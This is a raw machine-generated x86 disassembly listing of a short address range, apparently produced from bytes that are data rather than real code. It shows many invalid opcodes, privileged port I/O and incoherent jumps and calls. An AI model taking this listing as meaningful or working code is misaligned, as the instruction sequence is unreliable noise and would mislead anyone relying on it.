  41d9a7:	xor    DWORD PTR [edi+0x52830bea],eax
  41d9ad:	xor    ch,dl
  41d9af:	int    0x81
  41d9b1:	mov    al,0x3b
  41d9b3:	inc    edi
  41d9b4:	sbb    al,0xe4
  41d9b6:	fcomp  QWORD PTR [edi]
  41d9b8:	pop    ecx
  41d9b9:	lods   al,BYTE PTR ds:[esi]
  41d9ba:	loop   0x41d9a0
  41d9bc:	jo     0x41da1b
  41d9be:	xor    dl,BYTE PTR ds:0x7bed5fb0
  41d9c4:	sub    al,0xa2
  41d9c6:	(bad)  
  41d9c7:	adc    bh,BYTE PTR [edx+0x4a]
  41d9ca:	jo     0x41d9fb
  41d9cc:	push   esp
  41d9cd:	ficom  DWORD PTR [ebx-0x77]
  41d9d0:	jnp    0x41da1b
  41d9d2:	xor    DWORD PTR [ebp+0x32],edx
  41d9d5:	int    0xbb
  41d9d7:	aas    
  41d9d8:	scas   al,BYTE PTR es:[edi]
  41d9d9:	div    BYTE PTR cs:[edi+0x500e8158]
  41d9e0:	nop
  41d9e1:	leave  
  41d9e2:	out    0x43,eax
  41d9e4:	push   es
  41d9e5:	xchg   ebp,eax
  41d9e6:	sti    
  41d9e7:	jae    0x41da58
  41d9e9:	out    0x81,eax
  41d9eb:	jp     0x41da4d
  41d9ed:	cdq    
  41d9ee:	out    dx,al
  41d9ef:	into   
  41d9f0:	(bad)  
  41d9f2:	push   esi
  41d9f3:	out    dx,al
  41d9f4:	js     0x41d98b
  41d9f6:	jecxz  0x41d9e1
  41d9f8:	out    dx,al
  41d9f9:	xor    edx,DWORD PTR [edx+edx*1+0x4d298598]
  41da00:	push   0xc0ffb988
  41da05:	sbb    eax,DWORD PTR [edi-0x338f28d]
  41da0b:	jno    0x41da83
  41da0d:	mov    ss,esi
  41da0f:	cmp    al,0xf9
  41da11:	xchg   ecx,eax
  41da12:	xchg   esi,eax
  41da13:	stos   BYTE PTR es:[edi],al
  41da14:	repnz int3 
  41da16:	addr16 and ecx,0xe460c952
  41da1d:	(bad)  
  41da1f:	fisub  DWORD PTR [ebx+0x67]
  41da22:	jae    0x41d9bb
  41da24:	pop    ss
  41da25:	mov    ebp,0xef7f52d6
  41da2a:	outs   dx,DWORD PTR ds:[esi]
  41da2b:	icebp  
  41da2c:	shl    bl,cl
  41da2e:	adc    ebp,DWORD PTR [esi-0x43]
  41da31:	jecxz  0x41da59
  41da33:	ds jbe 0x41daac
  41da36:	inc    edx
  41da37:	cmp    eax,0xcd2109ac
  41da3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da3d:	shl    BYTE PTR [ecx+ebp*1-0x2cf729b5],0xf9
  41da45:	test   BYTE PTR [ebp-0x72227337],bh
  41da4b:	sub    DWORD PTR [eax],edx
  41da4d:	xchg   edi,eax
  41da4e:	sahf   
  41da4f:	js     0x41da20
  41da51:	xchg   ebx,eax
  41da52:	lahf   
  41da53:	mov    ecx,0x9f2df770
  41da58:	js     0x41da37
  41da5a:	retf   0x4697
  41da5d:	lods   al,BYTE PTR ds:[esi]
  41da5e:	jmp    0x41da65
  41da60:	jecxz  0x41da63
  41da62:	cld    
  41da63:	gs (bad) 
  41da65:	lahf   
  41da66:	mov    ecx,0xf8793eef
  41da6b:	neg    bl
  41da6d:	int    0xe6
  41da6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da70:	leave  
  41da71:	dec    edi
  41da72:	pop    ebx
  41da73:	out    0x6,eax
  41da75:	(bad)  
  41da76:	xchg   ebx,eax
  41da77:	add    al,0x12
  41da79:	fcmovb st,st(0)
  41da7b:	mov    esp,0x2eee66d9
  41da80:	adc    esi,DWORD PTR [ebp+0xe]
  41da83:	scas   al,BYTE PTR es:[edi]
  41da84:	lds    ebp,FWORD PTR [eax-0x3c]
  41da87:	sub    DWORD PTR [ecx],edi
  41da89:	aam    0x13
  41da8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da8c:	dec    eax
  41da8d:	loop   0x41daad
  41da8f:	es ja  0x41da2a
  41da92:	test   eax,0xa4c6d742
  41da97:	(bad)  
  41da99:	xchg   edx,eax
  41da9a:	dec    eax
  41da9b:	daa    
  41da9c:	es dec ebp
  41da9e:	ins    BYTE PTR es:[edi],dx
  41da9f:	jmp    0x488430d3
  41daa4:	add    BYTE PTR [ebp+0x46910806],dl
  41daaa:	test   DWORD PTR [ecx+0x1b],ebx
  41daad:	jmp    0xbb3ddcf4
  41dab2:	test   al,0xb8
  41dab4:	cwde   
  41dab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dab6:	mov    al,0x5b
  41dab8:	xchg   edi,eax
  41dab9:	nop
  41daba:	jo     0x41da58
  41dabc:	gs addr16 push ss
  41dabf:	nop
  41dac0:	cs (bad) 
  41dac2:	jmp    FWORD PTR [edx+0x45]
  41dac5:	mov    cl,0xb6
  41dac7:	ret    
  41dac8:	(bad)  
  41dac9:	idiv   BYTE PTR [eax]
  41dacb:	pop    esp
  41dacc:	add    eax,0xace0bd56
  41dad1:	inc    edi
  41dad2:	aam    0x72
  41dad4:	lods   eax,DWORD PTR ds:[esi]
  41dad5:	sub    ebx,DWORD PTR [ecx+0x321c07cc]
  41dadb:	inc    ebx
  41dadc:	inc    edx
  41dadd:	pop    esp
  41dade:	mov    ds:0x8711d813,al
  41dae3:	call   0x59cc:0x7198b286
  41daea:	pushf  
  41daeb:	sbb    edx,esp
  41daed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daee:	les    esi,FWORD PTR [ebx-0x2c5ae775]
  41daf4:	cmp    DWORD PTR [ecx+0x77],edx
  41daf7:	cmp    DWORD PTR [ebp+0x6a5a944],0xd8974e81
  41db01:	imul   edx,DWORD PTR [esi+0x79],0xffffffaa
  41db05:	xor    ebp,DWORD PTR [esi+edx*2-0x76e9b1bd]
  41db0c:	cmp    eax,ebx
  41db0e:	xchg   edx,eax
  41db0f:	dec    eax
  41db10:	ret    
  41db11:	lods   eax,DWORD PTR ds:[esi]
  41db12:	push   es
  41db13:	push   es
  41db14:	scas   al,BYTE PTR es:[edi]
  41db15:	jecxz  0x41db00
  41db17:	pop    ecx
  41db18:	lds    eax,FWORD PTR [edi+0x27]
  41db1b:	mov    gs:0xb032ab41,al
  41db21:	xchg   BYTE PTR [ebx+0x23],dl
  41db24:	xchg   DWORD PTR [edi],ebx
  41db26:	and    al,0x75
  41db28:	loopne 0x41db56
  41db2a:	jl     0x41db08
  41db2c:	fwait
  41db2d:	rol    BYTE PTR [edx],0x96
  41db30:	add    dh,BYTE PTR [edx+0x4]
  41db33:	sar    bh,1
  41db35:	popf   
  41db36:	cmp    BYTE PTR [ebp-0x26dc6122],0xe8
  41db3d:	test   DWORD PTR [ebx+esi*8],esp
  41db40:	arpl   WORD PTR [edx-0x66813a3f],dx
  41db46:	pop    DWORD PTR [edx]
  41db48:	xor    DWORD PTR [ebp+0x6ca63176],ebp
  41db4e:	pop    ebp
  41db4f:	pop    ss
  41db50:	push   es
  41db51:	mov    bh,0x7f
  41db53:	sub    ebx,DWORD PTR [edx+0xfd284d4]
  41db59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5a:	mov    ecx,0xe4bf42ea
  41db5f:	mov    ds:0x4fb9521a,al
  41db64:	xchg   ebx,eax
  41db65:	add    ecx,DWORD PTR [esi-0x68]
  41db68:	add    DWORD PTR [ecx+0x34],0x1251fba6
  41db6f:	bound  esp,QWORD PTR [ecx+0x75c0c072]
  41db75:	mov    cl,0xb
  41db77:	mov    bl,0x70
  41db79:	fsubr  DWORD PTR [ecx+0x7]
  41db7c:	mov    ebp,0x84a2b153
  41db81:	nop
  41db82:	rol    BYTE PTR [esi],cl
  41db84:	cmp    eax,eax
  41db86:	inc    edi
  41db87:	pop    esi
  41db88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db89:	cmp    esi,DWORD PTR [edx-0x40658181]
  41db8f:	mov    edi,esi
  41db91:	cmp    edx,edx
  41db93:	push   ds
  41db94:	pop    esp
  41db95:	xor    al,0x42
  41db97:	or     dl,cl
  41db99:	js     0x41dc14
  41db9b:	enter  0x53c6,0xeb
  41db9f:	sbb    al,0x2e
  41dba1:	push   cs
  41dba2:	adc    DWORD PTR [ebx-0x43b3a140],ebx
  41dba8:	pop    DWORD PTR [edx+0x22]
  41dbab:	stos   BYTE PTR es:[edi],al
  41dbac:	xchg   esi,eax
  41dbad:	cs int3 
  41dbaf:	fsubr  DWORD PTR [eax+0xc]
  41dbb2:	mov    esi,0x26cac4d8
  41dbb7:	sbb    DWORD PTR [edx-0x738db68e],0xb0c1862
  41dbc1:	ss scas al,BYTE PTR es:[edi]
  41dbc3:	ins    BYTE PTR es:[edi],dx
  41dbc4:	mov    cl,0xb7
  41dbc6:	xor    esp,ecx
  41dbc8:	out    0x37,al
  41dbca:	or     al,0x38
  41dbcc:	cmc    
  41dbcd:	aas    
  41dbce:	cld    
  41dbcf:	ss mov bh,0x15
  41dbd2:	arpl   WORD PTR [ecx+edi*4+0x599fd7cc],di
  41dbd9:	in     eax,0xd7
  41dbdb:	cld    
  41dbdc:	gs call 0xb5b3:0x5c68c359
  41dbe4:	mov    ch,0x9b
  41dbe6:	retf   0x2a9d
  41dbe9:	mov    BYTE PTR [ebp+0x6e18bf2c],dh
  41dbef:	call   esi
  41dbf1:	sub    ebx,DWORD PTR [eax+edi*8+0x4d]
  41dbf5:	iret   
  41dbf6:	lds    eax,FWORD PTR [edi]
  41dbf8:	or     cl,BYTE PTR [ecx-0x1fa11b23]
  41dbfe:	in     eax,dx
  41dbff:	lahf   
  41dc00:	mov    edi,ebp
  41dc02:	jge    0x41dc25
  41dc04:	fist   DWORD PTR [edi]
  41dc06:	pop    esp
  41dc07:	add    eax,0xf52ff8
  41dc0c:	fmul   QWORD PTR [ebx]
  41dc0e:	repnz enter 0x6f91,0x97
  41dc13:	(bad)  
  41dc15:	lahf   
  41dc16:	(bad)  
  41dc17:	clc    
  41dc18:	cmp    al,BYTE PTR [ecx-0x42]
  41dc1b:	sar    DWORD PTR [eax],0xeb
  41dc1e:	jge    0x41dc09
  41dc20:	sbb    DWORD PTR [edi+edx*2],ebp
  41dc23:	test   BYTE PTR [esi-0x4e2b8f9d],ch
  41dc29:	jle    0x41dc28
  41dc2b:	fnstenv [edx+ebp*1+0x378d34c5]
  41dc32:	dec    esi
  41dc33:	bound  ecx,QWORD PTR [edx+0x412d25c9]
  41dc39:	push   esi
  41dc3a:	dec    eax
  41dc3b:	frstor [edi+0x31]
  41dc3e:	and    al,0xe9
  41dc40:	stos   DWORD PTR es:[edi],eax
  41dc41:	scas   al,BYTE PTR es:[edi]
  41dc42:	pop    ecx
  41dc43:	call   0x6278a21b
  41dc48:	xchg   ebx,eax
  41dc49:	nop
  41dc4a:	add    DWORD PTR ds:[eax+0x8],0x1a22512d
  41dc52:	add    esp,DWORD PTR [ecx]
  41dc54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc55:	push   edx
  41dc56:	pop    ecx
  41dc57:	loop   0x41dc0a
  41dc59:	sbb    BYTE PTR [edi+edx*4],al
  41dc5c:	test   DWORD PTR [ebx],esi
  41dc5e:	xchg   ebx,eax
  41dc5f:	mov    dl,0x4e
  41dc61:	rol    cl,cl
  41dc63:	aaa    
  41dc64:	mov    ah,0x46
  41dc66:	fsubr  DWORD PTR [ebx+ebx*2-0xa]
  41dc6a:	or     ax,0xd0f3
  41dc6e:	xor    cl,BYTE PTR [ebx-0x53c512ff]
  41dc74:	dec    esp
  41dc75:	cmp    DWORD PTR [ecx+0x36],ebx
  41dc78:	pop    esp
  41dc79:	push   edi
  41dc7a:	adc    al,0x1c
  41dc7c:	xchg   ebp,eax
  41dc7d:	and    DWORD PTR [edi+0x18],eax
  41dc80:	xor    dh,BYTE PTR [eax]
  41dc82:	and    eax,DWORD PTR [edx-0x32ba4cd4]
  41dc88:	stc    
  41dc89:	dec    esi
  41dc8a:	js     0x41dcb2
  41dc8c:	outs   dx,BYTE PTR ds:[esi]
  41dc8d:	mov    dl,0xe1
  41dc8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc90:	ins    BYTE PTR es:[edi],dx
  41dc91:	push   edi
  41dc92:	mov    ebx,0x138eea8c
  41dc97:	lods   eax,DWORD PTR ds:[esi]
  41dc99:	adc    cl,BYTE PTR [ecx+0x41]
  41dc9c:	addr16 pop ss
  41dc9e:	xor    DWORD PTR [ecx],esi
  41dca0:	aad    0xf3
  41dca2:	jmp    0x21824357
  41dca7:	stos   DWORD PTR es:[edi],eax
  41dca8:	pop    eax
  41dca9:	jmp    0x5d04:0x438ff334
  41dcb0:	out    0xa,al
  41dcb2:	sahf   
  41dcb3:	aad    0xc1
  41dcb5:	adc    dh,BYTE PTR [esi+0x72c2d9a8]
  41dcbb:	pop    ecx
  41dcbc:	test   DWORD PTR [ebp+0x58],ecx
  41dcbf:	test   ch,al
  41dcc1:	lahf   
  41dcc2:	in     al,dx
  41dcc3:	sbb    al,0xe7
  41dcc5:	icebp  
  41dcc6:	mov    esp,0xcb715c68
  41dccb:	loope  0x41dcfe
  41dccd:	mov    bh,0x1c
  41dccf:	pop    ecx
  41dcd0:	loop   0x41dcb6
  41dcd2:	ficom  DWORD PTR [eax+0x4b7f1b22]
  41dcd8:	pop    ds
  41dcd9:	scas   al,BYTE PTR es:[edi]
  41dcda:	out    dx,eax
  41dcdb:	xchg   edi,eax
  41dcdc:	mov    ds:0xf4e697f6,al
  41dce1:	cmp    ecx,DWORD PTR [eax-0x22]
  41dce4:	pop    ds
  41dce5:	mov    al,0x60
  41dce7:	loopne 0x41dc9e
  41dce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcea:	mov    es,edx
  41dcec:	inc    ebp
  41dced:	push   ecx
  41dcee:	push   0x75
  41dcf0:	test   eax,0x200000
  41dcf5:	dec    ecx
  41dcf6:	inc    esp
  41dcf7:	inc    ecx
  41dcf8:	push   esp
  41dcf9:	lds    esi,FWORD PTR [eax]
  41dcfb:	sbb    esi,DWORD PTR [eax-0x36f92c17]
  41dd01:	pop    eax
  41dd02:	mov    WORD PTR [ebp+0x22],cs
  41dd05:	cdq    
  41dd06:	mov    ebp,0x84bed915
  41dd0b:	xchg   edi,eax
  41dd0c:	imul   DWORD PTR [ebx-0x41a83b43]
  41dd12:	mov    al,ds:0xab26fe17
  41dd17:	cli    
  41dd18:	cs out dx,al
  41dd1a:	mul    BYTE PTR [eax-0x170c7e08]
  41dd20:	inc    ecx
  41dd21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd23:	scas   eax,DWORD PTR es:[edi]
  41dd24:	inc    eax
  41dd25:	hlt    
  41dd26:	xchg   esi,eax
  41dd27:	or     cl,BYTE PTR [ebx+0x3325a0b2]
  41dd2d:	clc    
  41dd2e:	hlt    
  41dd2f:	cmp    DWORD PTR [eax+0x7f],ecx
  41dd32:	mov    edi,0xf8fa6367
  41dd37:	push   WORD PTR [ebx]
  41dd3a:	neg    BYTE PTR [ebx-0x21]
  41dd3d:	adc    al,0xd4
  41dd3f:	retf   
  41dd40:	adc    ebp,esp
  41dd42:	lahf   
  41dd43:	mov    ch,0x3c
  41dd45:	(bad)  
  41dd46:	xor    esi,ecx
  41dd48:	sbb    ax,0x5d65
  41dd4c:	adc    BYTE PTR [esi],ah
  41dd4e:	xchg   esi,eax
  41dd4f:	int    0x76
  41dd51:	ret    0xd57
  41dd54:	mov    edi,0xd2242e96
  41dd59:	xchg   edi,eax
  41dd5a:	lds    esp,FWORD PTR [eax+0x34]
  41dd5d:	push   eax
  41dd5e:	sbb    ecx,DWORD PTR [edi-0x5d]
  41dd61:	jae    0x41dd31
  41dd63:	aaa    
  41dd64:	pop    ss
  41dd65:	imul   ecx,DWORD PTR [ecx],0x6921b89c
  41dd6b:	push   ecx
  41dd6c:	es sbb al,0x60
  41dd6f:	dec    eax
  41dd70:	xor    ecx,DWORD PTR [edi]
  41dd72:	dec    esp
  41dd73:	mul    BYTE PTR [esi+0x7c]
  41dd76:	in     eax,0x37
  41dd78:	or     al,0x79
  41dd7a:	(bad)  [edi+0x18af83bc]
  41dd80:	(bad)  
  41dd81:	pop    esp
  41dd82:	push   edi
  41dd83:	sub    eax,0xbacb1951
  41dd88:	stc    
  41dd89:	or     al,0xb7
  41dd8b:	lahf   
  41dd8c:	sub    eax,ebx
  41dd8e:	fstp   QWORD PTR [esi+0x634baea4]
  41dd94:	rcl    DWORD PTR [eax+0x61891f27],1
  41dd9a:	jecxz  0x41dd3e
  41dd9c:	jo     0x41dd87
  41dd9e:	mov    bh,0x4f
  41dda0:	and    cl,BYTE PTR [ebx+0x73]
  41dda3:	xchg   esi,eax
  41dda4:	outs   dx,BYTE PTR ds:[esi]
  41dda5:	mov    edi,0xcef6eec4
  41ddaa:	dec    ebp
  41ddab:	out    dx,eax
  41ddac:	cld    
  41ddad:	pop    es
  41ddae:	idiv   DWORD PTR [ebp-0x2d]
  41ddb1:	xchg   edi,eax
  41ddb2:	or     cl,BYTE PTR [ebx]
  41ddb4:	js     0x41ddf7
  41ddb6:	add    eax,0xf76e0e41
  41ddbb:	add    bh,BYTE PTR [edx-0x1c]
  41ddbe:	popa   
  41ddbf:	mov    bl,0xf5
  41ddc1:	int3   
  41ddc2:	mov    ch,0x9f
  41ddc4:	adc    al,0x43
  41ddc6:	ins    DWORD PTR es:[edi],dx
  41ddc7:	jp     0x41dddf
  41ddc9:	push   esp
  41ddca:	(bad)  [ecx+0x566531bd]
  41ddd0:	pop    esp
  41ddd1:	and    edx,DWORD PTR [edx]
  41ddd3:	xchg   ecx,eax
  41ddd4:	adc    BYTE PTR [ebx],dl
  41ddd6:	leave  
  41ddd7:	and    al,0x44
  41ddd9:	inc    edx
  41ddda:	mov    ds:0x279c4,eax
  41dddf:	mov    ebx,0xa8c22f98
  41dde4:	les    ecx,FWORD PTR [esi]
  41dde6:	(bad)  
  41dde8:	inc    eax
  41dde9:	mov    BYTE PTR [ecx+0x45],ch
  41ddec:	call   0xd218522b
  41ddf1:	mov    ch,0x49
  41ddf3:	imul   esp,DWORD PTR [ebx-0x5e3b45db]
  41ddfa:	(bad)  
  41ddfb:	jns    0x41de2f
  41ddfd:	lea    edx,ds:0x6773a49
  41de03:	aam    0x28
  41de05:	inc    ecx
  41de06:	bound  ebp,QWORD PTR [esi+0x28d12b23]
  41de0c:	loop   0x41de68
  41de0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de0f:	pop    ebp
  41de10:	retf   
  41de11:	inc    esi
  41de12:	xchg   ebx,eax
  41de13:	and    al,0xc1
  41de15:	add    eax,0x6156ac92
  41de1a:	cmp    DWORD PTR [edx+0x17],edx
  41de1d:	pushf  
  41de1e:	sub    al,bh
  41de20:	lods   al,BYTE PTR ds:[esi]
  41de21:	ficom  DWORD PTR [ecx]
  41de23:	and    edi,DWORD PTR [ebx]
  41de25:	les    ebx,FWORD PTR [edx]
  41de27:	inc    ebx
  41de28:	and    DWORD PTR [eax-0x48],esi
  41de2b:	cwde   
  41de2c:	jb     0x41de98
  41de2e:	jns    0x41ddbf
  41de30:	arpl   WORD PTR [ebx+0xe5e9c3b],bp
  41de36:	fdiv   QWORD PTR [eax+ebp*2]
  41de39:	mov    eax,0x492c77d5
  41de3e:	and    ch,BYTE PTR [ecx]
  41de40:	add    eax,0x24ac890d
  41de45:	dec    ecx
  41de46:	test   BYTE PTR [esp+eax*8+0x52],al
  41de4a:	fwait
  41de4b:	cmp    ebp,DWORD PTR [eax]
  41de4d:	in     eax,0xe
  41de4f:	dec    edx
  41de50:	jae    0x41de6d
  41de52:	inc    ebx
  41de53:	sti    
  41de54:	jb     0x41dec0
  41de56:	sti    
  41de57:	push   edx
  41de58:	push   es
  41de59:	jbe    0x41dde0
  41de5b:	pop    ecx
  41de5c:	lock dec esp
  41de5e:	dec    ebp
  41de5f:	int    0xc4
  41de61:	push   ss
  41de62:	pop    esp
  41de63:	inc    esp
  41de64:	fsub   DWORD PTR [ecx]
  41de66:	sbb    DWORD PTR [edx+0x47c82d21],ecx
  41de6c:	jmp    0x41ddf0
  41de6e:	mov    ds:0x41b59283,eax
  41de73:	dec    ecx
  41de74:	pop    ecx
  41de75:	cmp    BYTE PTR [edx],al
  41de77:	mov    edx,0x49a0dc30
  41de7c:	leave  
  41de7d:	call   0x7d719462
  41de82:	js     0x41de22
  41de84:	mov    edi,0x533be4ff
  41de89:	je     0x41de5f
  41de8b:	push   edi
  41de8c:	or     BYTE PTR [edx],ah
  41de8e:	dec    edx
  41de8f:	xchg   edi,eax
  41de90:	xchg   ecx,eax
  41de91:	ja     0x41dedb
  41de93:	loope  0x41de50
  41de95:	out    0x3a,al
  41de97:	aas    
  41de98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de99:	push   0xa1dce622
  41de9e:	setns  BYTE PTR [ebp-0x52]
  41dea2:	or     BYTE PTR [edi+esi*8+0x78a0327],ah
  41dea9:	add    ah,0x84
  41deac:	fsub   DWORD PTR [edi+0x1fff243f]
  41deb2:	xor    dh,BYTE PTR [edi+eiz*1]
  41deb5:	sbb    dl,BYTE PTR [edi]
  41deb7:	lods   eax,DWORD PTR ds:[esi]
  41deb8:	les    edx,FWORD PTR [ecx+0xf]
  41debb:	cmp    BYTE PTR [edi-0x37],0xe8
  41debf:	xchg   ebx,eax
  41dec0:	repnz outs dx,BYTE PTR ds:[esi]
  41dec2:	pop    esi
  41dec3:	scas   al,BYTE PTR es:[edi]
  41dec4:	lahf   
  41dec5:	jecxz  0x41de86
  41dec7:	mul    BYTE PTR [ebx]
  41dec9:	adc    BYTE PTR [edx+ebx*1+0x24],0x9
  41dece:	test   edx,ebp
  41ded0:	mov    esi,0xbb7d2b2d
  41ded5:	jo     0x41ded1
  41ded7:	mov    ah,0xb
  41ded9:	xchg   ebx,eax
  41deda:	out    dx,al
  41dedb:	push   ebx
  41dedc:	or     eax,0x5ff51f6
  41dee1:	into   
  41dee2:	mov    al,0x8
  41dee4:	adc    esi,edx
  41dee6:	pop    ss
  41dee7:	(bad)  
  41dee8:	shl    BYTE PTR ds:0x8148b60,1
  41deee:	inc    edi
  41def0:	jmp    FWORD PTR [ebx+0x4fbd91e2]
  41def6:	jae    0x41df5e
  41def8:	hlt    
  41def9:	pop    edx
  41defa:	mov    dh,0x55
  41defc:	mov    DWORD PTR [ecx],edx
  41defe:	mov    esp,0x72da2658
  41df03:	lods   eax,DWORD PTR ds:[esi]
  41df04:	frstor [ebp-0x55]
  41df07:	fucom  st(0)
  41df09:	push   eax
  41df0a:	jns    0x41de90
  41df0c:	or     ecx,DWORD PTR [edi+0x3e599a47]
  41df12:	mov    eax,0x1b4bd5c0
  41df17:	or     al,0x56
  41df19:	test   DWORD PTR [ebx],esi
  41df1b:	(bad)  
  41df1d:	and    bh,al
  41df1f:	or     bl,BYTE PTR [eax+0x71]
  41df22:	and    DWORD PTR [eax+ebp*2-0x11561e74],0x1
  41df2a:	jle    0x41df18
  41df2c:	pop    ds
  41df2d:	scas   eax,DWORD PTR es:[edi]
  41df2e:	loopne 0x41df9b
  41df30:	mov    eax,ds:0x57963a6d
  41df35:	xchg   al,bh
  41df37:	mov    ds:0x6b782a20,al
  41df3c:	sbb    BYTE PTR [ebx-0x712499eb],bl
  41df42:	pop    ss
  41df43:	jge    0x41dfc2
  41df45:	int    0x89
  41df47:	out    dx,eax
  41df48:	jp     0x41dee2
  41df4a:	aad    0xd7
  41df4c:	cmp    eax,0xeed9ba61
  41df51:	iret   
  41df52:	jb     0x41df14
  41df54:	ins    DWORD PTR es:[edi],dx
  41df55:	jge    0x41df88
  41df57:	mov    bh,0x17
  41df59:	lods   al,BYTE PTR ds:[esi]
  41df5a:	sbb    eax,ebp
  41df5c:	iret   
  41df5d:	aas    
  41df5e:	div    BYTE PTR [ebx+0x67]
  41df61:	iret   
  41df62:	call   0x44cb:0x83cafff7
  41df69:	mov    esi,0x5ceb78db
  41df6e:	loope  0x41df21
  41df70:	(bad)  
  41df72:	test   DWORD PTR [eax+0x5f765b2f],ecx
  41df78:	cli    
  41df79:	mov    eax,ds:0x2927dda4
  41df7e:	int3   
  41df7f:	aam    0x20
  41df81:	mov    ah,0xf3
  41df83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df84:	sub    dl,BYTE PTR [ebx+0x6a027b14]
  41df8a:	test   BYTE PTR [esi+0x88155c9],ch
  41df90:	imul   esp,DWORD PTR [ebp+edx*4+0x84886d0],0x93b9465d
  41df9b:	js     0x41e003
  41df9d:	mov    ds:0x98ed331d,eax
  41dfa2:	dec    ebx
  41dfa3:	fcmovb st,st(7)
  41dfa5:	cmp    al,0x46
  41dfa7:	out    0xa1,al
  41dfa9:	mov    ds:0x3b4e8109,eax
  41dfae:	out    0xa1,al
  41dfb0:	and    esp,esp
  41dfb2:	jle    0x41e029
  41dfb4:	push   ecx
  41dfb5:	popa   
  41dfb6:	(bad)  
  41dfb7:	sub    DWORD PTR [ebx+0x4d],ebx
  41dfba:	inc    edi
  41dfbb:	rol    DWORD PTR [edx-0xf59da4b],cl
  41dfc1:	clc    
  41dfc2:	rcl    BYTE PTR [ebx-0x5],cl
  41dfc5:	add    DWORD PTR [edi-0x21adae35],eax
  41dfcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfcc:	mov    eax,ds:0x87409693
  41dfd1:	enter  0x238c,0x36
  41dfd5:	jb     0x41df6a
  41dfd7:	test   DWORD PTR [edi],edx
  41dfd9:	cmp    esi,DWORD PTR [eax-0x5a]
  41dfdc:	add    DWORD PTR ds:0x4c08ed18,ecx
  41dfe2:	mov    DWORD PTR [ebp+edi*8-0x277b5779],esp
  41dfe9:	and    dh,BYTE PTR [esp+ecx*4-0x13]
  41dfed:	dec    ebx
  41dfee:	jmp    0x5c687767
  41dff3:	ret    0xcfa8
  41dff6:	ds inc bx
  41dff9:	mov    ds:0x25b9fef0,eax
  41dffe:	pop    eax
  41dfff:	iret   
  41e000:	sbb    al,0xa1
  41e002:	xlat   BYTE PTR ds:[ebx]
  41e003:	imul   ebp
  41e005:	inc    ecx
  41e006:	lods   eax,DWORD PTR ds:[esi]
  41e007:	cmp    eax,0xaa605760
  41e00c:	call   0xd2b6:0xc7d90862
  41e013:	cmc    
  41e014:	mov    ebp,0x8c1d82bf
  41e019:	enter  0x7ffb,0x11
  41e01d:	jns    0x41dfad
  41e01f:	rol    edi,1
  41e021:	jl     0x41dffe
  41e023:	inc    bx
  41e025:	mov    WORD PTR [eax+eiz*8],fs
  41e028:	das    
  41e029:	out    0x90,al
  41e02b:	pop    esi
  41e02c:	jb     0x41dfec
  41e02e:	fld    QWORD PTR [edi+0x309949d0]
  41e034:	mov    ebp,0x524c6a33
  41e039:	fdiv   QWORD PTR [ecx]
  41e03b:	cs test al,0xba
  41e03e:	or     eax,ebp
  41e040:	sahf   
  41e041:	dec    esp
  41e042:	fsub   st(1),st
  41e044:	xor    DWORD PTR [eax+ebx*4+0x21f6459d],eax
  41e04b:	hlt    
  41e04c:	ins    DWORD PTR es:[edi],dx
  41e04d:	mov    ecx,0x5162c73d
  41e052:	jge    0x41dfe4
  41e054:	add    esp,edi
  41e056:	lahf   
  41e057:	repz mov bl,BYTE PTR [esi-0x15]
  41e05b:	loopne 0x41dfdd
  41e05d:	ficom  DWORD PTR [edi-0x2]
  41e060:	and    esp,DWORD PTR [edi]
  41e062:	idiv   BYTE PTR [ebp+0x5fb02036]
  41e068:	enter  0xffdb,0x2
  41e06c:	xchg   edx,eax
  41e06d:	pop    ds
  41e06e:	sar    BYTE PTR [edi+0x5c1e2600],1
  41e074:	in     eax,dx
  41e075:	pop    ss
  41e076:	into   
  41e077:	bound  eax,QWORD PTR [ecx]
  41e079:	jb     0x41e0a3
  41e07b:	pop    ebp
  41e07c:	jbe    0x41e07c
  41e07e:	sub    eax,DWORD PTR [edi-0x6a]
  41e081:	fsqrt  
  41e083:	test   al,0xf0
  41e085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e086:	aas    
  41e087:	stc    
  41e088:	xor    eax,0x181b961c
  41e08d:	leave  
  41e08e:	sub    DWORD PTR [esi+0x35],ebx
  41e091:	jp     0x41e0a6
  41e093:	and    edi,DWORD PTR [ebx-0x74]
  41e096:	stos   DWORD PTR es:[edi],eax
  41e097:	int    0x1c
  41e099:	loop   0x41e033
  41e09b:	cmp    ebp,edx
  41e09d:	mov    ebx,0x1e25ca99
  41e0a2:	jp     0x41e0f3
  41e0a4:	inc    ebx
  41e0a5:	aaa    
  41e0a6:	dec    ebp
  41e0a7:	frstor [esi+0x8b59f3]
  41e0ad:	aas    
  41e0ae:	test   BYTE PTR [ebx],0x3
  41e0b1:	mov    ch,dl
  41e0b3:	imul   ecx,DWORD PTR [esi+0x75a531fa],0x6d31c614
  41e0bd:	and    ecx,DWORD PTR [edi-0x18863213]
  41e0c3:	in     al,dx
  41e0c4:	mov    bh,0x39
  41e0c6:	jge    0x41e12b
  41e0c8:	shl    esi,0xd5
  41e0cb:	cmp    eax,0xa28e9366
  41e0d0:	lock adc al,0x45
  41e0d3:	inc    ecx
  41e0d4:	xlat   BYTE PTR ds:[ebx]
  41e0d5:	xor    DWORD PTR [ecx-0x72],0x102786c9
  41e0dc:	mov    ecx,0x7c4e3ada
  41e0e1:	frstor ds:0xef5ded02
  41e0e7:	cli    
  41e0e8:	daa    
  41e0e9:	out    dx,eax
  41e0ea:	mov    eax,0xb6b72feb
  41e0ef:	pop    ss
  41e0f0:	jbe    0x41e16d
  41e0f2:	inc    ecx
  41e0f3:	mov    BYTE PTR [eax-0x10],al
